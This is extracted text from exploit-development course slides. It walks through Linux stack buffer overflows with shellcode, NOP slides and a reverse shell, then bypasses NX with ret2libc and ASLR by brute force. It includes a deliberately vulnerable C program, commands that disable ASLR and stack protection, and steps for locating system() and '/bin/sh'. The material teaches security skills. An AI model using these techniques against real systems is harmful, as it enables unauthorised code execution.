should not be a part of the shellcode (bad characters).
|  p.111
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The result buffer can be now pasted into the exploit. 
For convenience, we can also instruct msfvenom to store
the generated payload into a file instead of displaying it on
the terminal.
|  p.112
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The last thing to check is at what address does the 
shellcode reside in at the moment of the crash. Let’s use 
the first payload (so EIP is 0x42424242) to quickly debug 
the program.
|  p.113
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
We examine 200 bytes starting from the current esp –
0x230. This is the address where the program buffer 
begins. We can also see where the „AAAAA”s begin, which
is at the following address: 0xbfffed70 + 0x8
|  p.114
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Hardcoding an address in an exploit is considered a bad 
practice and often results in poor reliability. 
However, as this is a basic exploit, we do not need to care 
about this right now.
|  p.115
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The shellcode starts at 0xbfffed78. As even the
environment variable changes might move the stack a few 
bytes back or forth, let’s add some more reliability by 
adding a NOP slide before the shellcode.
NOP is a No-Operation instruction (opcode 0x90) and does 
nothing. Its original purpose was to help with measuring 
processor performance by performing just an empty cycle.
|  p.116
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
We can add some NOPs at the beginning of the shellcode. 
As NOPs are empty operations, if the execution flow is 
moved to a long sequence of NOPs (called a NOP slide), 
the program will execute them along the way to the 
shellcode that is placed after them. It doesn’t matter if the 
execution flow is moved into the middle of a NOP Slide or 
into its beginning – as long as the shellcode is at its end, it 
will be finally executed. 
|  p.117
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The full exploit can be seen below. The commented part is 
the exploit without NOPs and is there for clarity. We are 
decreasing the „A”’s number by subtracting the shellcode 
length from it.
|  p.118
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Executing the program within gdb shows that the exploit 
worked!
|  p.119
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The reverse shell is also received. Let’s also check if the 
exploit is working outside of gdb.
|  p.120
1.3.3 From EIP Control To Code Execution
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Depending on your OS configuration, this might end up 
ugly.
|  p.121
1.3.4 Debugging Common Obstacles
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
This is a common scenario in exploit development, and you 
should be prepared to face situations like that. 
Apparently, outside gdb, the given shellcode address is not 
valid. This is most likely due to a different environment 
setup outside of gdb.
|  p.122
1.3.4 Debugging Common Obstacles
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Using core dump, it is possible to examine what happened:
|  p.123
1.3.4 Debugging Common Obstacles
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
In this case, the stack changed. Let’s adjust the exploit so
that it matches the address in an outside-gdb crash. We 
see that the NOP-slide starts at 0xbfffedc0 + 0x8. Let’s also 
change the address to 0xbfffedc8 and rerun the exploit.
|  p.124
1.3.4 Debugging Common Obstacles
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
After the change and re-running the application, we see that 
the execution hangs and no segfault is present.
|  p.125
1.3.4 Debugging Common Obstacles
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The netcat listener shows that the reverse shell was 
received.
|  p.126
1.3.4 Debugging Common Obstacles
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
As previously mentioned, this is a basic exploit, and its 
reliability was proved low even when running it outside of a 
debugger. 
Reliability is one of the most important factors when rating 
the impact of an exploit. The more systems it can run on, 
the more versatle it is.
|  p.127
1.3.4 Debugging Common Obstacles
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
In the next modules, you will learn how to improve the 
reliability of your exploits, as well as how to beat common 
anti-exploit mechanisms.
|  p.128
1.3 Abusing the EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a Linux 
stack overflow vulnerability in a 
binary. This time you will have to find 
the proper payload length for 
precisely overwriting EIP, in addition 
to using your own shellcode. You will 
also be shown how to overcome 
commonly found obstacles.
Linux Basic Stack 
Overflow
|  p.129
Hera Lab #2
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
References
|  p.130
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
References
PEDA - Python Exploit Development Assistance for GDB
gdb
Dynamic Linking in ELF
https://github.com/longld/peda
ftp://ftp.gnu.org/old-gnu/Manuals/gdb/html_chapter/gdb_9.html
http://dandylife.net/blog/archives/660
|  p.131
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Hidden Function Lab
In this lab, you will practice identifying and exploiting a Linux stack overflow 
vulnerability in a binary. You will also learn how to find reusable code within the 
binary to facilitate exploitation.
Linux Basic Stack Overflow
In this lab, you will practice identifying and exploiting a Linux stack overflow 
vulnerability in a binary. This time you will have to find the proper payload length 
for precisely overwriting EIP, in addition to using your own shellcode. You will 
also be shown how to overcome commonly found obstacles.
|  p.132
© Caendra Inc. 2019
All Rights Reserved
Linux Exploit Countermeasures & 
Bypasses
S e c t i o n  0 1  |  M o d u l e  0 2
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Table of Contents
MODULE 02 | LINUX EXPLOIT COUNTERMEASURES & 
BYPASSES
2.1 Linux Exploit Protections
2.2 NoExecute
2.3 ASLR
2.4 Stack Cookie
2.5 RELRO
2.6 Other Protections
|   p.2
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
Common Linux exploit countermeasures
How to bypass common Linux exploit 
countermeasures
|   p.3
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
2.1
Linux Exploit 
Protections
|  p.4
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In the previous module, we exploited a basic stack-based 
buffer overflow. In fact, in a modern system, you can rarely 
spot a binary that can be exploited that easily. 
Although stack-based buffer overflows can still be met on 
real-life systems (e.g., on suid binaries), they are secured 
with some popular countermeasures. 
2.1 Linux Exploit Protections
|  p.5
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In order to make exploitation harder, several methods were 
invented over the last few years. The most popular ones 
are:
• Making the stack non-executable
• Randomizing addresses at each program run
|  p.6
2.1 Linux Exploit Protections
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
At the reconnaissance phase, where we try to figure out 
what the target binary is doing, we can use another tool that 
will help us to detect what exploit protections are in place.
You can use the checksec script to examine an executable 
and display what exploit mitigation it uses.
https://github.com/slimm609/checksec.sh
2.1 Linux Exploit Protections
|  p.7
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Checksec can be cloned to the target system. For 
convenience, you can put a symlink to the main script in the 
path, so that it can be invoked from any location, as follows.
ln –s /full/path/checksec.sh/checksec /usr/bin/checksec
2.1 Linux Exploit Protections
|  p.8
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
You can use the script in following way:
The result shows all protections employed by the target 
binary. 
2.1 Linux Exploit Protections
|  p.9
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Each of those mechanisms can make your life as an exploit 
developer harder. Used together, they require a strong 
understanding of exploitation techniques to bypass them.
The primer for all exploitation activities is the EIP control. If 
you are able to set the EIP to an arbitrary value, you are
already halfway to creating a working exploit. 
2.1 Linux Exploit Protections
|  p.10
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The countermeasures start to matter on the way from the
EIP control to shellcode. During the basic overflow
examples it was possible to simply jump to an address of 
the buffer. When proper protections are in place, the buffer 
may have an unknown address and may not be executable 
at all.
The next chapters will describe the most common exploit 
protections in Linux, together with ways to bypass them.
2.1 Linux Exploit Protections
|  p.11
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
2.2
NoExecute
|  p.12
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The No eXecute bit is the most popular countermeasure 
that can be found in most modern software pieces. The 
idea is that data on the stack is not executable. 
This mitigation is also often referred to as DEP – Data 
Execution Prevention. 
2.2 NoExecute
|  p.13
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-
prevention-dep/4634
No eXecute was invented in 2004, and it makes use of 
the No eXecute (NX) bit in AMD processors, and the Execute 
Disable Bit (XD) in Intel processors on both 32 bit and 64-bit 
architectures.
If you try to execute any data that lies on the stack, for 
example after moving the execution flow back to the stack 
after a buffer overflow, the program will crash with a 
SIGSEGV. 
2.2 NoExecute
|  p.14
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
NX alone can be easily bypassed. As you already know, in
the x86 architecture when a function call is made, the 
arguments are pushed onto the stack, and then a function 
is called.
NX disallows the execution of data on the stack but having 
function arguments on the stack is perfectly fine.
2.2.1 Bypassing NX (ret2libc)
|  p.15
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
During a stack overflow, we are controlling the data pushed 
on the stack as it is overflown with our custom buffer. So in 
order to bypass the NX protection, we can supply function 
arguments as part of the buffer and then make the EIP 
point to another function that will utilize them.
There are numerous functions that can be reused for that 
purpose. They can reside in the executable itself or in any 
library used by it.
2.2.1 Bypassing NX (ret2libc)
|  p.16
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The idea is very similar to what we did with the „hidden 
function” where we called a function that was already in the 
program by making the EIP point to it. 
The difference this time is that we need to set up the stack 
properly.
2.2.1 Bypassing NX (ret2libc)
|  p.17
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The upcoming techniques that we will see belong to the 
„ret2” family. They are named as such because we are 
returning to another area of the program from the stack. 
You might already have seen names like ret2libc or 
ret2system. 
Among the numerous libraries that software use, in the 
Linux world, the most common one is the standard C library 
named LIBC. 
2.2.1 Bypassing NX (ret2libc)
|  p.18
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Libc is the standard C Library in Linux, which is present on 
all systems by default and contains some basic functions 
required for programs to run properly. We can check if our 
target binary uses the library by issuing the following 
command.
Or, we can use the following from within gdb.
2.2.1 Bypassing NX (ret2libc)
|  p.19
ldd [binary_name]
vmmap
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
nm -D /lib/$(uname -m)-linux-gnu/libc-*.so | grep -vw U | grep -v 
"_" | cut -d " " -f3
You can list all functions provided by your system’s libc by 
issuing the following command in the terminal.
|  p.20
2.2.1 Bypassing NX (ret2libc)
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
As we previously stated, we will attempt to reuse one of the 
functions already stored by the process memory in the libc 
area.
What you need to know about libc or any other library, is 
that it can be perceived as a list of functions that reside at a 
known offset from the library base. 
2.2.1 Bypassing NX (ret2libc)
|  p.21
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Whenever you know the library base, and the library version, 
you will also know the target function’s address. The 
distance between the library’s base address and the target 
function address is called an offset.
Using this information, let’s proceed further.
2.2.1 Bypassing NX (ret2libc)
|  p.22
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We know that there are certain functions available in the 
libc and we can use them, for example, to spawn a shell. 
To call a function, we need to prepare the stack properly so 
that it contains arguments to the function to be called.
2.2.1 Bypassing NX (ret2libc)
|  p.23
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
NX prevents execution from the stack but having 
arguments in there is perfectly fine. 
So, in order to execute a function that is in libc, we need to:
•
Find an interesting function that will provide us with a shell
•
Set up the stack properly
•
Overwrite the EIP with the abovementioned function’s address
2.2.1 Bypassing NX (ret2libc)
|  p.24
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
You might want to use one of the following that will 
instantly result in command execution:
• System
• Exec* (execl, execle, exelp, execv, execve, etc…) 
2.2.1 Bypassing NX (ret2libc)
|  p.25
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
There are also more advanced techniques that will be 
explained throughout the course, like:
• Using read/write to read/overwrite arbitrary memory 
• ret2strcpy / ret2read / ret2main, etc. to cause another 
overflow in case the buffer size is limited
• Call a chain of functions to alter the execution flow in a 
complex way
2.2.1 Bypassing NX (ret2libc)
|  p.26
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s follow a custom example of a vulnerable binary. 
#include <stdio.h>
#include <unistd.h>
int overflow() {
char buffer[500];
int userinput;
userinput = read(0, buffer, 700);
printf(„\nUser provided %d bytes. Buffer content is: %s\n”, userinput, buffer);
return 0;
}
int main (int argc, char * argv[]) {
overflow();
return 0;
}
|  p.27
2.2.2 NX Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The source code from the previous slide is compiled using 
gcc. This time, we do not supply the -z execstack 
argument, as we want the stack to be non-executable 
(which is supported by default).
However, we do not want the compiler to implement the 
stack protector, so we will use the following instruction:
gcc –fno-stack-protector vulnerable.c –o vulnerable
2.2.2 NX Bypass Example
|  p.28
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Remember to turn off ASLR with:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
|  p.29
2.2.2 NX Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We will start to develop the exploit the usual way.
Since this is the same binary as in the previous module, the 
process should be familiar to you at least to the point of the
EIP control.
2.2.2 NX Bypass Example
|  p.30
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
After confirming that the program works, we can run it 
under gdb.
2.2.2 NX Bypass Example
|  p.31
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s create a pattern bigger than the buffer size and store it into a 
file. Let’s then supply it as an input to the binary. Upon segfault, we 
can examine the EIP and get the proper offset to it, as follows.
2.2.2 NX Bypass Example
|  p.32
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In order to write addresses in a convenient way, we will 
create a python exploit generator. The file exploit.txt will be 
fed to the target binary.
2.2.2 NX Bypass Example
|  p.33
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s try to execute any data from the stack. We can do it in 
the debugger to see how NX protects the binary. Let’s 
examine our buffer down the stack and overwrite EIP with 
any address of our choice. For example, we could use
0xbfffef50.
2.2.2 NX Bypass Example
|  p.34
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The exploit is quickly modified. Remember that the address 
of the stack that we would like to execute data from should 
not contain any null bytes.
2.2.2 NX Bypass Example
|  p.35
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Running the exploit now ends up in a Segmentation Fault.
2.2.2 NX Bypass Example
|  p.36
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We can see in the EIP dump that we were executing valid 
instructions. Apart from the segmentation fault generic 
error, there is no separate message related to the NX 
protection.
2.2.2 NX Bypass Example
|  p.37
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Now that we know how this exploit protection works, let’s 
try to use the ret2libc (or in other words, ret2system) 
technique in order to circumvent it.
The last thing we need to know is the stack layout that is
required to call a function. It should contain:
• A saved return address 
• Arguments to the chosen function
2.2.2 NX Bypass Example
|  p.38
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
When sending the evil buffer to the binary, we need the data 
related to the calling system to reside past EIP.
Let’s take a look at the example below. We restore the original 
state of the exploit.py script (which generated exploit.txt) and we 
add some extra data at the end of the buffer.
2.2.2 NX Bypass Example
|  p.39
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
From now on, we will skip the generation of the payload. 
Just after every change in the exploit, the file is generated 
again.
2.2.2 NX Bypass Example
|  p.40
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
If we now examine the stack at the moment of the crash, 
we can see that the addition to the buffer was placed there.
2.2.2 NX Bypass Example
|  p.41
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
According to what was said, if „BBBB” was an address of a 
function that is called, then CCCC (0x43434343) should be
the return address to be restored after executing that 
function, and DDDD and EEEE should be arguments to that 
function. Of course, there could be more arguments, those 
two were used as an example.
2.2.2 NX Bypass Example
|  p.42
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s replace the placeholders with real addresses and data, 
as follows:
• BBBB – EIP – the address of the function that will spawn 
the shell.
• CCCC – return address – the address where the
execution flow returns to after the shell is closed. This 
can be literally any value, if we are not interested in 
exiting gracefully. However, we do mind, and this will be 
replaced with the address of the exit() function. 
2.2.2 NX Bypass Example
|  p.43
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
• EEEE and further buffers – This will be replaced with 
arguments to the called function. As we now know how 
to set up the stack, let’s focus on finding a suitable 
function.
2.2.2 NX Bypass Example
|  p.44
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
int system(const char *cmd);
Since System() requires the least arguments, it will be 
simpler to use this function. You can search for online 
documentation or use the Linux man pages to examine 
what arguments are required for certain functions.
|  p.45
2.2.2 NX Bypass Example
Let’s find its address.
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We can use two methods to do it. Remember that we are 
operating on a non-ASLR system. 
The presented methods will not work when ASLR is in 
place. However, we do not need to care about it at this 
point. 
2.2.2 NX Bypass Example
|  p.46
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
First, let’s check what the system()’s offset is from the 
beginning of libc, as follows. This command can be used 
during local (not remote) exploitation. In case of remote 
exploitation we will need to somehow identify the version 
of libc being used on the target OS. Usually, it is related to 
the OS version and architecture.
|  p.47
2.2.2 NX Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019 |  p.48
2.2.2 NX Bypass Example
Here, we know the offset of system – it is 0x3ada0 for this 
libc version. 
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The address space of libc can be checked also from within
gdb. When debugging the target binary, issue the below 
command.
The output of that command will show the addresses to 
which libc is mapped. As you will see, only some part of libc 
is mapped in executable memory (so this is the space from 
which we will call libc functions).
2.2.2 NX Bypass Example
|  p.49
vmmap libc
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We should choose the address that has an executable 
permission (x) as we want to execute something from libc. 
Now, if we add the libc base + the system offset, we will get 
the address of the system() function.
2.2.2 NX Bypass Example
|  p.50
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
p system
Let’s check if we calculated the address of the system function correctly.
|  p.51
2.2.2 NX Bypass Example
Below is another way of identifying  the system function’s address.
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019 |  p.52
2.2.2 NX Bypass Example
The same can be done regarding the exit function.
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We now have 2 out of the 3 elements required to complete 
our exploit. Let’s insert the addresses of system() and 
exit():
2.2.2 NX Bypass Example
|  p.53
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The last thing we need to do is find an argument for the
system() function. For example, it can be „/bin/bash”. 
Keep in mind, that system() requires a pointer to the string 
as an argument and not the string itself, so we cannot 
simply append „/bin/bash” at the end of the buffer. We 
need to find an address within the target executable where 
the string „/bin/bash” (or similar) resides.
2.2.2 NX Bypass Example
|  p.54
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Gdb-peda has a convenient built-in search utility. We can 
simply type „find [string]” and it will display all results from 
the program memory. We will look for „/bin/” as we can use 
/bin/bash, „/bin/sh”, „/bin/csh” or other shells.
2.2.2 NX Bypass Example
|  p.55
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Various string references are found. 
As the stack was already proven to be very unreliable, let’s 
choose the address from libc that points to „/bin/sh”.
2.2.2 NX Bypass Example
|  p.56
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
There is another way of supplying the /bin/sh string in case it is 
not findable in the library or in the environment variables, which
can be used in local exploitation only. In bash, type:
The string will then be findable at the bottom of the stack, near 
other environment variables. PEDA will also be able to locate it.
export SHELL='/bin/sh'
|  p.57
2.2.2 NX Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Now let’s add the address of „/bin/sh” to the exploit:
2.2.2 NX Bypass Example
|  p.58
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Executing the exploit in the gdb shows that bash was 
spawned. Let’s try it outside of gdb:
2.2.2 NX Bypass Example
|  p.59
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The result is confusing; regardless of the buffer overflow, 
the binary seems to exit normally. This is because the exit() 
function was implemented.
2.2.2 NX Bypass Example
|  p.60
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
If you went through the stack overflow lab of module 1, you 
already know what the issue is- the bash shell is spawned, 
but as there is no STDIN opened, it is immediately closed, 
and then the exit function is executed.
When opening bash via exploits like this, we need to 
implement a cheat that will hold the standard input open so 
we can operate on the spawned shell.
2.2.2 NX Bypass Example
|  p.61
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We will use the double cat trick. We pipe the double cat 
command into the exploit instead of just cat’ting the exploit 
content. The second cat command makes the newly 
spawned bash shell wait for input. 
You can try to execute the „cat” command with no 
arguments and see that the terminal waits for input. The 
same happens with shells spawned during an exploitation 
process, allowing us to interact with them.
2.2.2 NX Bypass Example
|  p.62
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Finally, running the exploit with the double cat command 
allows us to obtain a working shell using the ret2libc 
technique.
2.2.2 NX Bypass Example
|  p.63
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a 
stack overflow vulnerability 
on a Linux system with NX 
enabled. To bypass the NX 
mechanism, you will use the 
ret2libc technique.
Linux NX Bypass 
(ret2libc)
|  p.64
Hera Lab
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
2.3
ASLR
|  p.65
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/
Address Space Layout Randomization (ASLR) is an exploit 
countermeasure introduced on the Operating System level. When 
ASLR is turned on, upon launching a new process, its core 
memory areas will be loaded at a different address each time. 
The ASLR setting is held in a file:
2.3 ASLR
|  p.66
/proc/sys/kernel/randomize_va_space
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
This file is writable only by the superuser and can have the 
following values: 
•
0 – ASLR is OFF
•
1 – ASLR is ON – the stack, the virtual dynamic shared object 
page, and the shared memory regions are randomized
•
2 – ASLR is ON, in addition to 1, the data segments are 
randomized too
2.3 ASLR
|  p.67
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
echo 0 > /proc/sys/kernel/randomize_va_space
In order to change the ASLR settings on the system, you 
can type the following from the root account.
https://decoder.cloud/2017/06/15/simple-aslrnx-bypass-on-a-linux-32-bit-binary/
|  p.68
2.3 ASLR
Or, using sudo you can type:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
kernel.randomize_va_space=0
ASLR can be permanently set to one of the aforementioned 
values, which of course requires superuser privileges.
In order to do that, append the following line to the end of
the /etc/sysctl.conf file. Remember, the value can be 0, 1 
or 2.
https://hacked0x90.wordpress.com/2016/10/30/bypassing-aslr-
protection-using-brute-force/
|  p.69
2.3 ASLR
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
After that, reboot the system or force the system to apply 
the changes immediately by issuing the following 
command:
In order to observe ASLR in action, we can use the ldd
command, which prints out the libraries used by an 
executable together with addresses of those libraries.
sysctl –p
|  p.70
2.3 ASLR
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
As you can see, with each run of the /bin/ping executable 
the libc library is loaded at a different address. If we would 
like to hardcode any address from this library in an exploit, 
ASLR would render it unreliable.
2.3 ASLR
|  p.71
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
However, ASLR can be beaten. The first bypass method we 
will cover is abusing low ASLR entropy, which is likely to 
work on older kernels.
Addresses might be randomized, but if we are trying to 
exploit a local binary that can be run mutiple times, a brute 
force attack might be an option.
2.3.1 Bypassing ASLR (abusing low ASLR entropy)
|  p.72
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
If you run the ldd command on an executable multiple 
times on older systems, you will notice that the addresses 
do not differ vastly from each other. The below screenshot 
is from an ubuntu 16.04 x86 with randomize_va_space set 
to 2.
2.3.1 Bypassing ASLR (abusing low ASLR entropy)
|  p.73
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Only one byte in the middle of the four-byte long address 
changes throughout the runs of the binary. Since the byte’s value 
might be in the range of 0 to 0xFF, there is a 1/256 probability of
hitting a proper address, if we try to guess, for example, the libc 
base for a ret2libc-based attack. Also, brute-forcing the address 
of the stack where the shellcode resides is much easier in that 
case.
From a brute-force attack perspective, a 1/256 probability equals 
guaranteed success. The disadvantage of this method is its low 
usability against modern operating systems.
2.3.1 Bypassing ASLR (abusing low ASLR entropy)
|  p.74
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Bypassing ASLR on modern systems requires a more 
complex approach. As it is usually paired with a non-
executable stack, more advanced exploits needs to be 
used. 
Such exploits will be presented in later content.
2.3.1 Bypassing ASLR (abusing low ASLR entropy)
|  p.75
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s try to exploit the familiar vulnerable C binary, this time 
with full ASLR turned on on Ubuntu 16 x86.
2.3.2 ASLR Bypass Example
|  p.76
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We will use the same vulnerable source code.
#include <stdio.h>
#include <unistd.h>
int overflow() {
char buffer[500];
int userinput;
userinput = read(0, buffer, 700);
printf(„\nUser provided %d bytes. Buffer content is: %s\n”, userinput, buffer);
return 0;
}
int main (int argc, char * argv[]) {
overflow();
return 0;
}
|  p.77
2.3.2 ASLR Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The source code from the previous slide is compiled using 
gcc. Let’s also not have an executable stack. So for this 
exercise, we will have to beat ASLR + NX at once. 
We do not want the compiler to implement the stack 
protector, so we will use the following instruction:
gcc –fno-stack-protector vulnerable.c –o vulnerable
|  p.78
2.3.2 ASLR Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Now, let’s run the program several times and observe how 
the libc base changes. Note that we need to inspect that 
during runtime, and not at the beginning or post-crash when 
analyzing a coredump. The most convenient way to 
examine the libc address will be to:
• Run the program with gdb
• Set a breakpoint (e.g. on main() function)
• Examine the address
2.3.2 ASLR Bypass Example
|  p.79
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We will proceed in this way: after reaching the breakpoint, 
let’s issue the „vmmap libc” command.
2.3.2 ASLR Bypass Example
|  p.80
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We can see the first position in the list starts at 
0xb7e09000. We will now repeat those steps a few times to 
see how the address changes.
2.3.2 ASLR Bypass Example
|  p.81
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Watch out for gdb disabling ASLR. If you see the same 
address each time you run the binary, you might need to 
issue the below command.
set disable-randomization off
|  p.82
2.3.2 ASLR Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
After setting up the breakpoint at main(), we can run and 
then vmmap libc several times. We will notice that each 
time there are two changing bytes in the address.
2.3.2 ASLR Bypass Example
|  p.83
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We have already said that each entry in libc is organized to 
reside at a constant offset from the base. 
Also, in the ret2libc technique we utlized three elements 
that reside in libc – the address of system(), the address of 
exit(), and the address of the string „/bin/sh” that also is 
placed in libc.
2.3.2 ASLR Bypass Example
|  p.84
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
All of those elements have a constant offset from the libc 
base that can be measured and saved. We can use the 
ret2libc technique also in this case, but we will try to brute-
force the libc addresses.
The libc base can be guessed, as there is 1/256 probability 
in each run that we have the proper libc base address.
2.3.2 ASLR Bypass Example
|  p.85
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
If we create an exploit that uses offsets from the base 
address of libc, we need to guess the libc’s base and then 
all of the other addresses will be calculated based on it. 
If we hit the wrong libc address, nothing happens. If we 
guess the correct one, the exploit will work.
2.3.2 ASLR Bypass Example
|  p.86
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Moreover, we do not really need to perform dynamically-
generated address guessing. 
Each run of the libc’s base address is random, but as there 
are only 256 possible values, if we run the same exploit with 
a hardcoded libc address enough times, at some point we 
will guess the correct address as the randomization will 
meet our hardcoded address.
2.3.2 ASLR Bypass Example
|  p.87
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In this example, we will not perform vulnerability discovery 
from the beginning. 
The pattern/offset part is omitted, as it was thourougly 
explained before.
We discovered that 516 bytes of buffer are required to start 
overflowing the EIP.
2.3.2 ASLR Bypass Example
|  p.88
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
According to the ret2libc technique, this is our initial 
exploit. We want to overwrite EIP with the address of 
system(), and then place on the stack the address of exit() 
and the address of the string „/bin/sh”.
2.3.2 ASLR Bypass Example
|  p.89
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Now, we need to set the base addresses of those three 
elements based on the libc’s base. Let’s prepare the exploit 
for that modification by creating variables that will hold 
those addresses.
2.3.2 ASLR Bypass Example
|  p.90
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We will also make use of the python „struct” module, which 
can help us convert numeric values to little endian instead 
of manually writing the bytes in reverse order. The full 
